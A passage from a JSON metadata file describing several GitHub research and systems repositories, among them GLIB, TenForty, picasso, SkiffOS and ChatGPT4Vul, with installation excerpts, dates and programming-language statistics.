                    "value": "```shell\npython saliencymap.py --test_data test_data_path --model model_path\n```\n\nExample:\n\n```shell\npython saliencymap.py --test_data data/data_csv/testDataSet/testData_test.csv --model model/Code/Code.pkl\n```\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Generate saliency map",
                    "parent_header": [
                        "GLIB",
                        "Installation and Execution"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/GLIB-game/GLIB/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-25T02:30:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-15T10:09:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 11386
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1849
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "330": {
        "filename": "Tizpaz_TenForty_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Tizpaz/TenForty",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To run the tool, you first need to download the [OpenTaxSolver](https://opentaxsolver.sourceforge.net/) software (we currently support 2018, 2019, 2020, and 2021 versions).  In doing so, you can access to the source code from [this link](https://sourceforge.net/projects/opentaxsolver/files/). Then, you need to include files from this reposirty in the ``tax_form_files/US_1040``. \n",
                    "type": "Text_excerpt",
                    "original_header": "Setup",
                    "parent_header": [
                        "TenForty"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Tizpaz/TenForty/main/readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-10T05:15:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-11T02:06:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 350908
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 12928
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "331": {
        "filename": "codingClaire_Structural-Code-Understanding_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/codingClaire/Structural-Code-Understanding",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-12-16T09:15:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-21T02:41:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 7314
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "332": {
        "filename": "merantix_picasso_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/merantix/picasso",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "   With pip:\n\n   .. code::\n\n        pip install picasso-viz\n\n   From the repository:\n\n   .. code::\n\n        git clone git@github.com:merantix/picasso.git\n        cd picasso\n        pip install -e .\n\n   Note: you'll need the Tensorflow backend for Keras for these examples to work.  Make sure your ``~/.keras/keras.json`` file looks like:\n\n   .. code::\n\n        {\n            \"backend\": \"tensorflow\",\n            \"image_dim_ordering\": \"tf\",\n            \"floatx\": \"float32\",\n            \"epsilon\": 1e-07\n        }\n",
                    "type": "Text_excerpt",
                    "original_header": ". Install with pip or from source."
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/merantix/picasso/master/README.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Picasso uses **Python 3.5+** so use a virtual environment if necessary (e.g. ``virtualenv env --python=python3``) and **activate it!**\n \n",
                    "original_header": "Quickstart"
                },
                "confidence": 0.9999995498592417,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/merantix/picasso/master/README.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n.. image:: https://img.shields.io/pypi/v/picasso-viz.svg\n        :target: https://pypi.python.org/pypi/picasso-viz \n.. image:: https://img.shields.io/travis/merantix/picasso.svg\n        :target: https://travis-ci.org/merantix/picasso \n.. image:: https://readthedocs.org/projects/picasso/badge/?version=latest\n        :target: https://picasso.readthedocs.io/en/latest/?badge=latest\n        :alt: Documentation Status \n.. image:: https://img.shields.io/codecov/c/github/merantix/picasso/master.svg   \n        :target: https://codecov.io/github/merantix/picasso?branch=master \n* Free software: Eclipse Public License\n* Documentation: https://picasso.readthedocs.io. \n"
                },
                "confidence": 0.9844889385379372,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/merantix/picasso/master/README.rst"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-05-15T08:19:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-16T18:55:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 77553
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 13043
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 5733
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2309
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 59
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "333": {
        "filename": "skiffos_skiffos_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/skiffos/SkiffOS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The Buildroot OS cross-compiler can target any Linux-compatible device or\nvirtual machine. These system configuration packages are available in the\nmain SkiffOS repository: \n| **System**            | **Config Package**        | **Bootloader**   | **Kernel**      |\n|-----------------------|---------------------------|------------------|-----------------|\n| VirtualBox            | [virt/virtualbox]         | N/A              | \u2714 6.10.11        |\n| [Docker Img]          | [virt/docker]             | N/A              | N/A             |\n| [Incus]               | [virt/incus]              | N/A              | \u2714 6.10.11        |\n| [Qemu]                | [virt/qemu]               | N/A              | \u2714 6.10.11        |\n| [UTM] on MacOS        | [apple/arm] + [virt/qemu] | N/A              | \u2714 6.10.11        |\n| [V86] on WebAssembly  | [browser/v86]             | [V86]            | \u2714 6.10.11        |\n| [WSL] on Windows      | [virt/wsl]                | N/A              | N/A             |\n|-----------------------|---------------------------|------------------|-----------------|\n| [Allwinner Nezha]     | [allwinner/nezha]         | \u2714 U-boot 2022.10 | \u2714 sm-6.1-rc3    |\n| [Apple Macbook Intel] | [apple/intel]             | \u2714 [rEFInd]       | \u2714 6.10.11        |\n| [Apple Silicon]       | [apple/arm]               | \u2714 UTM (as VM)    | \u2714 6.10.11        |\n| [BananaPi M1+/Pro]    | [bananapi/m1plus]         | \u2714 U-Boot 2023.07 | \u2714 6.10.11        |\n| [BananaPi M1]         | [bananapi/m1]             | \u2714 U-Boot 2023.07 | \u2714 6.10.11        |\n| [BananaPi M2]         | [bananapi/m2]             | \u2714 U-Boot 2023.07 | \u2714 6.10.11        |\n| [BananaPi M2+]        | [bananapi/m2plus]         | \u2714 U-Boot 2023.07 | \u2714 6.10.11        |\n| [BananaPi M2 Ultra]   | [bananapi/m2ultra]        | \u2714 U-Boot 2023.07 | \u2714 6.10.11        |\n| [BananaPi M3]         | [bananapi/m3]             | \u2714 U-Boot 2023.07 | \u2714 6.10.11        |\n| [BeagleBoard X15]     | [beaglebone/x15]          | \u2714 U-Boot 2022.04 | \u2714 5.10.168-ti   |\n| [BeagleBone AI]       | [beaglebone/ai]           | \u2714 U-Boot 2022.04 | \u2714 5.10.168-ti   |\n| [BeagleBone Black]    | [beaglebone/black]        | \u2714 U-Boot 2022.04 | \u2714 5.10.168-ti   |\n| [BeagleBoard BeagleV] | [starfive/visionfive]     | \u2714 U-Boot 2021.04 | \u2714 sv-5.19-rc3   |\n| **[Intel x86/64]**    | [intel/desktop]           | \u2714 [rEFInd]       | \u2714 6.10.11        |\n| [ModalAI Voxl2]       | [modalai/voxl2]           | N/A              | \u2714 msm-4.19.125  |\n| [NVIDIA Jetson AGX]   | [jetson/agx]              | \u2714 UEFI           | \u2714 [nv-5.10.120] |\n| [NVIDIA Jetson Nano]  | [jetson/nano]             | \u2714 U-Boot         | \u2714 [nv-4.9.337]  |\n| [NVIDIA Jetson TX2]   | [jetson/tx2]              | \u2714 U-Boot         | \u2714 [nv-4.9.337]  |\n| [Odroid C2]           | [odroid/c2]               | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid C4]           | [odroid/c4]               | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid H2]           | [odroid/h3]               | \u2714 [rEFInd]       | \u2714 6.10.11        |\n| [Odroid H2+]          | [odroid/h3]               | \u2714 [rEFInd]       | \u2714 6.10.11        |\n| [Odroid H3]           | [odroid/h3]               | \u2714 [rEFInd]       | \u2714 6.10.11        |\n| [Odroid H3+]          | [odroid/h3]               | \u2714 [rEFInd]       | \u2714 6.10.11        |\n| [Odroid HC1]          | [odroid/xu]               | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid HC2]          | [odroid/xu]               | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid HC4]          | [odroid/hc4]              | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid M1]           | [odroid/m1]               | \u2714 U-Boot 2017.09 | \u2714 tb-6.4.3      |\n| [Odroid N2]+          | [odroid/n2]               | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid N2L]          | [odroid/n2l]              | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid U]            | [odroid/u]                | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid XU3]          | [odroid/xu]               | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [Odroid XU4]          | [odroid/xu]               | \u2714 U-Boot 2023.07 | \u2714 tb-6.4.3      |\n| [OrangePi Lite]       | [orangepi/lite]           | \u2714 U-Boot 2018.05 | \u2714 6.10.11        |\n| [OrangePi Zero]       | [orangepi/zero]           | \u2714 U-Boot 2018.07 | \u2714 6.10.11        |\n| [PcDuino 3]           | [pcduino/3]               | \u2714 U-Boot 2019.07 | \u2714 6.10.11        |\n| [PcEngines APU2]      | [pcengines/apu2]          | \u2714 CoreBoot       | \u2714 6.10.11        |\n| [Pi 0]                | [pi/0]                    | N/A              | \u2714 rpi-6.6.45    |\n| [Pi 1]                | [pi/1]                    | N/A              | \u2714 rpi-6.6.45    |\n| [Pi 3] + 1, 2         | [pi/3]                    | N/A              | \u2714 rpi-6.6.45    |\n| [Pi 4]                | [pi/4]                    | N/A              | \u2714 rpi-6.6.45    |\n| [Pi 4] (32bit mode)   | [pi/4x32]                 | N/A              | \u2714 rpi-6.6.45    |\n| [Pi 5]                | [pi/5]                    | N/A              | \u2714 rpi-6.6.45    |\n| [Pine64 H64]          | [pine64/h64]              | \u2714 U-Boot 2022.04 | \u2714 megi-6.6-pre  |\n| [PineBook A64]        | [pine64/book_a64]         | \u2714 U-Boot (bin)   | \u2714 megi-6.6-pre  |\n| [PineBook Pro]        | [pine64/book]             | \u2714 U-Boot (bin)   | \u2714 megi-6.6-pre  |\n| [PinePhone]           | [pine64/phone]            | \u2714 U-Boot (bin)   | \u2714 megi-6.6-pre  |\n| [PinePhone Pro]       | [pine64/phone_pro]        | \u2714 U-Boot (bin)   | \u2714 megi-6.6-pre  |\n| [Rock64] rk3328       | [pine64/rock64]           | \u2714 U-Boot 2022.04 | \u2714 megi-6.6-pre  |\n| [RockPro64]           | [pine64/rockpro64]        | \u2714 U-Boot (bin)   | \u2714 megi-6.6-pre  |\n| [Sipeed LicheeRV]     | [allwinner/licheerv]      | \u2714 U-Boot 2022.07 | \u2714 sm-5.19-rc1   |\n| [VisionFive]          | [starfive/visionfive]     | \u2714 U-Boot 2021.04 | \u2714 sv-5.19-rc3   |\n| [VisionFive2] v1.2    | [starfive/visionfive2_12] | \u2714 U-Boot 2024.07 | \u2714 6.10.11        |\n| [VisionFive2] v1.3    | [starfive/visionfive2]    | \u2714 U-Boot 2024.07 | \u2714 6.10.11        |\n| [USBArmory Mk2]       | [usbarmory/mk2]           | \u2714 U-Boot 2020.10 | \u2714 6.10.11        |\n| Valve [Steam Deck]    | [valve/deck]              | N/A              | \u2714 valve-6.5.0   |\n| [Wandboard]           | [freescale/wandboard]     | \u2714 U-Boot 2022.04 | \u2714 6.10.11        | \n[Allwinner Nezha]: https://linux-sunxi.org/Allwinner_Nezha\n[Apple Macbook Intel]: https://wiki.gentoo.org/wiki/Apple_Macbook_Pro_Retina_(early_2013)\n[Apple Silicon]: https://support.apple.com/en-us/116943\n[BananaPi M1+/Pro]: http://linux-sunxi.org/LeMaker_Banana_Pi#Variants\n[BananaPi M1]: http://linux-sunxi.org/LeMaker_Banana_Pi#Variants\n[BananaPi M2]: http://linux-sunxi.org/LeMaker_Banana_Pi#Variants\n[BananaPi M2+]: http://linux-sunxi.org/LeMaker_Banana_Pi#Variants\n[BananaPi M2 Ultra]: http://linux-sunxi.org/LeMaker_Banana_Pi#Variants\n[BananaPi M3]: http://linux-sunxi.org/Banana_Pi_M3\n[BeagleBone AI]: http://beagleboard.org/ai\n[BeagleBone Black]: http://beagleboard.org/black\n[BeagleBoard X15]: http://beagleboard.org/x15\n[BeagleBoard BeagleV]: https://beagleboard.org/static/beagleV/beagleV.html\n[Docker Img]: ./docker\n[Intel x86/64]: ./configs/intel/x64\n[ModalAI Voxl2]: https://www.modalai.com/products/voxl-2\n[NVIDIA Jetson AGX]: https://developer.nvidia.com/embedded/jetson-agx-xavier-developer-kit\n[NVIDIA Jetson Nano]: https://developer.nvidia.com/embedded/jetson-nano-developer-kit\n[NVIDIA Jetson TX2]: https://developer.nvidia.com/embedded/jetson-tx2\n[Odroid C2]: https://wiki.odroid.com/odroid-c2/odroid-c2\n[Odroid C4]: https://wiki.odroid.com/odroid-c4/odroid-c4\n[Odroid H2]: https://www.hardkernel.com/shop/odroid-h2/\n[Odroid H2+]: https://www.hardkernel.com/shop/odroid-h2plus/\n[Odroid H3]: https://www.hardkernel.com/shop/odroid-h3/\n[Odroid H3+]: https://www.hardkernel.com/shop/odroid-h3-plus/\n[Odroid HC1]: https://www.hardkernel.com/shop/odroid-hc1-home-cloud-one/\n[Odroid HC2]: https://www.hardkernel.com/shop/odroid-hc2-home-cloud-two/\n[Odroid HC4]: https://www.hardkernel.com/shop/odroid-hc4/\n[Odroid M1]: https://wiki.odroid.com/odroid-m1/odroid-m1\n[Odroid N2]: https://wiki.odroid.com/odroid-n2/odroid-n2\n[Odroid N2L]: https://wiki.odroid.com/odroid-n2l\n[Odroid U]: https://wiki.odroid.com/old_product/odroid-x_u_q/odroid_u3/odroid-u3\n[Odroid XU3]: https://wiki.odroid.com/old_product/odroid-xu3/odroid-xu3\n[Odroid XU4]: https://wiki.odroid.com/odroid-xu4/odroid-xu4\n[OrangePi Lite]: http://linux-sunxi.org/Xunlong_Orange_Pi_One_%26_Lite\n[OrangePi Zero]: http://linux-sunxi.org/Xunlong_Orange_Pi_Zero\n[PcDuino 3]: https://linux-sunxi.org/LinkSprite_pcDuino3\n[PcEngines APU2]: https://www.pcengines.ch/apu2.htm\n[Pi 0]: https://www.raspberrypi.org/products/raspberry-pi-zero/\n[Pi 1]: https://www.raspberrypi.org/products/raspberry-pi-1-model-b-plus/\n[Pi 3]: https://www.raspberrypi.org/products/raspberry-pi-3-model-b/\n[Pi 4]: https://www.raspberrypi.org/products/raspberry-pi-4-model-b/\n[Pi 5]: https://www.raspberrypi.org/products/raspberry-pi-5/\n[Pine64 H64]: https://www.pine64.org/pine-h64-ver-b/\n[PineBook A64]: https://www.pine64.org/pinebook/\n[PineBook Pro]: https://www.pine64.org/pinebook-pro/\n[PinePhone]: https://www.pine64.org/pinephone/\n[PinePhone Pro]: https://www.pine64.org/pinephonepro/\n[Incus]: https://linuxcontainers.org/incus/\n[Qemu]: https://www.qemu.org/\n[Rock64]: https://www.pine64.org/devices/single-board-computers/rock64/\n[RockPro64]: https://www.pine64.org/rockpro64/\n[Sipeed LicheeRV]: https://linux-sunxi.org/Sipeed_Lichee_RV\n[VisionFive]: https://ameridroid.com/products/visionfive-starfive\n[VisionFive2]: https://ameridroid.com/products/visionfive-2\n[Steam Deck]: https://store.steampowered.com/steamdeck\n[USBArmory Mk2]: https://github.com/f-secure-foundry/usbarmory\n[UTM]: https://getutm.app/\n[V86]: https://copy.sh/v86/?profile=copy/skiffos\n[Wandboard]: https://elinux.org/Wandboard\n[WSL]: https://docs.microsoft.com/en-us/windows/wsl/\n[nv-4.9.337]: https://github.com/skiffos/linux/tree/skiff-jetson-4.9.x\n[nv-5.10.120]: https://github.com/skiffos/linux/tree/skiff-jetson-5.10.x\n[rEFInd]: https://www.rodsbooks.com/refind/ \n[open an issue]: https://github.com/skiffos/SkiffOS/issues/new\n \n",
                    "original_header": "Supported Systems"
                },
                "confidence": 0.9965945663573607,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "SkiffOS supports modular configuration packages: kernel & buildroot configs,\nroot filesystem overlays, patches, hooks, and other resources. \nLayers are named as `namespace/name`. For example, a Raspberry Pi 4\nconfiguration would be `pi/4` and Docker is `apps/docker`.\n```\n\u251c\u2500\u2500 cflags:         compiler flags in files\n\u251c\u2500\u2500 buildroot:      buildroot configuration fragments\n\u251c\u2500\u2500 buildroot_ext:  buildroot extensions (extra packages)\n\u251c\u2500\u2500 buildroot_patches: extra Buildroot global patches\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 <packagename>: patch files for Buildroot <packagename>\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 <packagename>/<version>: patches for package version\n\u251c\u2500\u2500 busybox:        busybox configuration fragments\n\u251c\u2500\u2500 extensions:     extra commands to add to the build system\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 Makefile\n\u251c\u2500\u2500 hooks:          scripts hooking pre/post build steps\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 post.sh\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 pre.sh\n\u251c\u2500\u2500 kernel:         kernel configuration fragments\n\u251c\u2500\u2500 kernel_patches: kernel .patch files\n\u251c\u2500\u2500 root_overlay:   root overlay files\n\u251c\u2500\u2500 metadata:       metadata files\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 commands\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dependencies\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 description\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 unlisted\n\u251c\u2500\u2500 resources:     files used by the configuration package\n\u251c\u2500\u2500 scripts:       any scripts used by the extensions\n\u251c\u2500\u2500 uboot:         u-boot configuration fragments\n\u251c\u2500\u2500 uboot_patches: u-boot .patch files\n\u2514\u2500\u2500 users:         additional buildroot user config files\n```\n \n",
                    "original_header": "Configuration Packages"
                },
                "confidence": 0.9952288774399689,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To add custom users, add files in the \"users\" dir with the [makeuser syntax]. \n[makeuser syntax]: https://buildroot.org/downloads/manual/manual.html#makeuser-syntax\n \n",
                    "original_header": "Custom Users"
                },
                "confidence": 0.9972145811201285,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "You can set the following env variables to control this process: \n - `SKIFF_CONFIG_PATH_ODROID_XU`: Set the path for the ODROID_XU config package. You can set this to add new packages or override old ones.\n - `SKIFF_EXTRA_CONFIGS_PATH`: Colon `:` separated list of paths to look for config packages.\n - `SKIFF_CONFIG`: Name of skiff config to use, or comma separated list to overlay, with the later options taking precedence \nThese packages will be available in the SkiffOS system.\n \n",
                    "original_header": "Out-of-tree configuration packages"
                },
                "confidence": 0.9697707160699879,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To apply the changes & re-pack the build, run \"make configure compile\" again.\n \n",
                    "original_header": "Overrides"
                },
                "confidence": 0.9998356298998914,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Use Workspaces to compile multiple `SKIFF_CONFIG` combinations simultaneously. \nThe `SKIFF_WORKSPACE` environment variable controls which workspace is selected. \nConfiguration files in `overrides/workspaces/$SKIFF_WORKSPACE/` will override\nsettings for that workspace using the configuration package structure.\n \n",
                    "original_header": "Workspaces"
                },
                "confidence": 0.9648795658664072,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Here is a minimal working example of running Skiff in Qemu:\n```sh\n$ SKIFF_CONFIG=virt/qemu,util/rootlogin make configure compile\n$ make cmd/virt/qemu/run\n```\n \nThe `util/rootlogin` package is used here to enable logging in as \"root\" on the\nqemu debug console shown when running \"cmd/virt/qemu/run\". \nQemu can emulate other architectures, for example, riscv64:\n```\nexport SKIFF_WORKSPACE=qemu\nexport SKIFF_CONFIG=virt/qemu,core/gentoo,util/rootlogin\nmkdir -p ./overrides/workspaces/qemu/buildroot\necho \"BR2_riscv=y\" > ./overrides/workspaces/qemu/buildroot/arch\nmake compile\n```\n \nThe parameters for running the VM can also be adjusted:\n```\nexport ROOTFS_MAX_SIZE=120G\nexport QEMU_MEMORY=8G\nexport QEMU_CPUS=8\nmake cmd/virt/qemu/run\n```\n \n",
                    "original_header": "Qemu"
                },
                "confidence": 0.9972242525655647,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Here is a minimal working example of running SkiffOS in Docker:\n```sh\n$ SKIFF_CONFIG=virt/docker,skiff/core make configure compile\n$ make cmd/virt/docker/buildimage\n$ make cmd/virt/docker/run\n\n# inside container\n$ su - core\n```\n \nYou can execute a shell inside the container with:\n```sh\n$ make cmd/virt/docker/exec\n# alternatively\n$ docker exec -it skiff sh\n```\nOr run the latest demo release on Docker Hub:\n```\ndocker run -t -d --name=skiff \\\n  --privileged \\\n  --cap-add=NET_ADMIN \\\n  --security-opt seccomp=unconfined \\\n  --stop-signal=SIGRTMIN+3 \\\n  -v /sys/fs/cgroup:/sys/fs/cgroup:ro \\\n  -v $(pwd)/skiff-persist:/mnt/persist \\\n  skiffos/skiffos:latest\n```\n \n",
                    "original_header": "Docker"
                },
                "confidence": 0.999407451353419,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Set the hostname by placing the desired hostname in the `skiff/hostname` file on\nthe persist partition. You could also set this in one of your config packages by\nwriting the desired hostname to `/etc/hostname`.\n \n",
                    "original_header": "Hostname"
                },
                "confidence": 0.9999257634141991,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The configuration file format for these connections is [documented\nhere](http://manpages.ubuntu.com/manpages/wily/man5/nm-settings-keyfile.5.html)\nwith examples. \nTo add the above example to your build: \n - `gedit ./overrides/root_overlay/etc/NetworkManager/system-connections/mywifi`\n - paste the above plaintext & save\n - run \"make compile\" to update the image with the changes.\n \n",
                    "original_header": "NetworkManager"
                },
                "confidence": 0.9902951437747283,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/skiffos/skiffos/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-04-22T03:10:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T04:34:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 236686
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 64676
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 42467
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 41529
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Nix",
                    "name": "Nix",
                    "type": "Programming_language",
                    "size": 3489
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 1216
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 615
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "334": {
        "filename": "se2p_artifact-pynguin-ssbse2020_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/se2p/artifact-pynguin-ssbse2020",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-07-27T15:49:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-04T15:49:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2473715
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 444656
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 241218
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 32531
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 15980
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 12805
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 4359
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "335": {
        "filename": "awsm-research_ChatGPT4Vul_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/awsm-research/ChatGPT4Vul",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First of all, clone this repository to your local machine and access the main dir via the following command:\n```\ngit clone https://github.com/awsm-research/ChatGPT4Vul.git\ncd ChatGPT4Vul\n``` \nThen run the following command to dowload and unzip the experimental datasets:\n```\nsh download_data.sh\n``` \n",
                    "original_header": "Datasets"
                },
                "confidence": 0.9996959190729948,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/awsm-research/ChatGPT4Vul/main/README.md"
            }
        ],
